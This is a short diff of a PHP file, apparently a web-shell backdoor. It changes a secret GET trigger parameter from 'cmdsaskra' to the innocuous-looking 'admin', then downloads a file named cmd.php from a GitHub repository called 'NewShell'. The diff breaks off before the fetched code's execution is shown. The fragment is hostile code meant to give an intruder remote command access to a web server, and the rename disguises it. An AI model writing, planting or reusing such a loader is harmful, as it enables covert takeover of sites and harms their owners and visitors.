@@ -1,5 +1,5 @@
 <?php 
-if (isset($_GET['cmdsaskra'])) {
+if (isset($_GET['admin'])) {
     $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
     $fileContents = file_get_contents($url);
 
